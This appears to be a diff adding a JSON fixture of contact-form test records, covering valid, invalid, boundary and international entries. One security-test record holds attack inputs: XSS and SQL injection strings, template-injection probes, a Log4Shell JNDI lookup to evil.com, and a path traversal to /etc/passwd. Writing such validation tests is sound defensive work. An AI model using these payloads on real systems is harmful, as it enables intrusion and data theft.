@@ -1,0 +1,142 @@
+{
+  "valid_contact_data": [
+    {
+      "id": "contact_001",
+      "first_name": "John",
+      "last_name": "Doe",
+      "email": "john.doe@example.com",
+      "company": "Test Company Inc",
+      "phone": "+1-555-123-4567",
+      "subject": "Product Inquiry",
+      "message": "I'm interested in learning more about your digital shelf analytics platform. Could you please provide more information about pricing and implementation?",
+      "country": "United States",
+      "industry": "Retail",
+      "company_size": "1000-5000 employees"
+    },
+    {
+      "id": "contact_002",
+      "first_name": "Jane",
+      "last_name": "Smith",
+      "email": "jane.smith@democorp.com",
+      "company": "Demo Corp",
+      "phone": "+44-20-1234-5678",
+      "subject": "Demo Request",
+      "message": "We would like to schedule a demo of your content optimization tools. Our team is particularly interested in the AI-powered features.",
+      "country": "United Kingdom",
+      "industry": "E-commerce",
+      "company_size": "500-1000 employees"
+    },
+    {
+      "id": "contact_003",
+      "first_name": "Carlos",
+      "last_name": "Rodriguez",
+      "email": "carlos.rodriguez@globaltech.com",
+      "company": "Global Tech Solutions",
+      "phone": "+34-91-123-4567",
+      "subject": "Partnership Inquiry",
+      "message": "We are exploring potential partnerships for our European expansion. Would like to discuss integration opportunities.",
+      "country": "Spain",
+      "industry": "Technology",
+      "company_size": "5000+ employees"
+    }
+  ],
+  "invalid_contact_data": [
+    {
+      "id": "invalid_contact_001",
+      "first_name": "",
+      "last_name": "",
+      "email": "invalid-email",
+      "company": "",
+      "phone": "invalid-phone",
+      "subject": "",
+      "message": "",
+      "country": "",
+      "industry": "",
+      "company_size": ""
+    },
+    {
+      "id": "invalid_contact_002",
+      "first_name": "A".repeat(100),
+      "last_name": "B".repeat(100),
+      "email": "toolong" + "x".repeat(250) + "@example.com",
+      "company": "C".repeat(500),
+      "phone": "1".repeat(50),
+      "subject": "S".repeat(200),
+      "message": "M".repeat(5000),
+      "country": "Invalid Country",
+      "industry": "Invalid Industry",
+      "company_size": "Invalid Size"
+    }
+  ],
+  "security_test_data": [
+    {
+      "id": "security_001",
+      "first_name": "<script>alert('xss')</script>",
+      "last_name": "'; DROP TABLE users; --",
+      "email": "test+<script>@example.com",
+      "company": "<img src=x onerror=alert('xss')>",
+      "phone": "javascript:alert('xss')",
+      "subject": "{{7*7}}",
+      "message": "${jndi:ldap://evil.com/exploit}",
+      "country": "../../../etc/passwd",
+      "industry": "<%=7*7%>",
+      "company_size": "{{config.items()}}"
+    }
+  ],
+  "boundary_test_data": [
+    {
+      "id": "boundary_001",
+      "first_name": "A",
+      "last_name": "B",
+      "email": "a@b.co",
+      "company": "X",
+      "phone": "1234567890",
+      "subject": "Test",
+      "message": "Hi",
+      "country": "US",
+      "industry": "IT",
+      "company_size": "1-10"
+    },
+    {
+      "id": "boundary_002",
+      "first_name": "A".repeat(50),
+      "last_name": "B".repeat(50),
+      "email": "test" + "x".repeat(60) + "@example.com",
+      "company": "C".repeat(100),
+      "phone": "+1-555-123-4567-ext-12345",
+      "subject": "S".repeat(100),
+      "message": "M".repeat(1000),
+      "country": "United States of America",
+      "industry": "Information Technology",
+      "company_size": "10000+ employees"
+    }
+  ],
+  "international_data": [
+    {
+      "id": "intl_001",
+      "first_name": "José",
+      "last_name": "García",
+      "email": "jose.garcia@empresa.es",
+      "company": "Empresa Española S.L.",
+      "phone": "+34-91-123-4567",
+      "subject": "Consulta sobre productos",
+      "message": "Hola, me gustaría obtener más información sobre sus productos de análisis digital.",
+      "country": "España",
+      "industry": "Comercio electrónico",
+      "company_size": "100-500 empleados"
+    },
+    {
+      "id": "intl_002",
+      "first_name": "田中",
+      "last_name": "太郎",
+      "email": "tanaka.taro@company.jp",
+      "company": "株式会社テスト",
+      "phone": "+81-3-1234-5678",
+      "subject": "製品についてのお問い合わせ",
+      "message": "デジタルシェルフ分析プラットフォームについて詳しく知りたいです。",
+      "country": "日本",
+      "industry": "小売業",
+      "company_size": "1000-5000人"
+    }
+  ]
+}
